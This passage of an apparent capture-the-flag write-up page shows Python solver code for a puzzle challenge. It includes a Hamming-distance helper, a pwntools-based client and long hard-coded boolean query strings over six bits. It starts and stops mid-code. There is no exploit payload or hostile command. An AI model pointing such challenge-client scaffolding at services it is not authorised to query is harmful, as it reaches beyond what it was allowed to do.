class="attribute">print</span>(len(nums))</span><br><span class="line">    <span class="attribute">assert</span> (len(nums) == <span class="number">32</span>)</span><br><span class="line">    <span class="attribute">for</span> j in range(<span class="number">32</span>):</span><br><span class="line">        <span class="attribute">n</span> = nums[j]</span><br><span class="line">        <span class="attribute">question</span> += part.format(n[<span class="number">0</span>], n[<span class="number">1</span>], n[<span class="number">2</span>], n[<span class="number">3</span>], n[<span class="number">4</span>], n[<span class="number">5</span>]) + <span class="string">&quot;or &quot;</span></span><br><span class="line">    <span class="attribute">questions</span>.append(question[:-<span class="number">4</span>])  # ?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> dif(a, b):</span><br><span class="line">    <span class="attribute">cnt</span> = <span class="number">0</span></span><br><span class="line">    <span class="attribute">for</span> i in range(len(a)):</span><br><span class="line">        <span class="attribute">if</span> a[i] != b[i]:</span><br><span class="line">            <span class="attribute">cnt</span> += <span class="number">1</span></span><br><span class="line">    <span class="attribute">return</span> cnt</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span>(questions)</span><br><span class="line"><span class="attribute">print</span>(dic)</span><br></pre></td></tr></table></figure><p><strong>part2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dif</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> a[i] != b[i]:</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">questions = [<span class="string">&#x27;( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>, <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 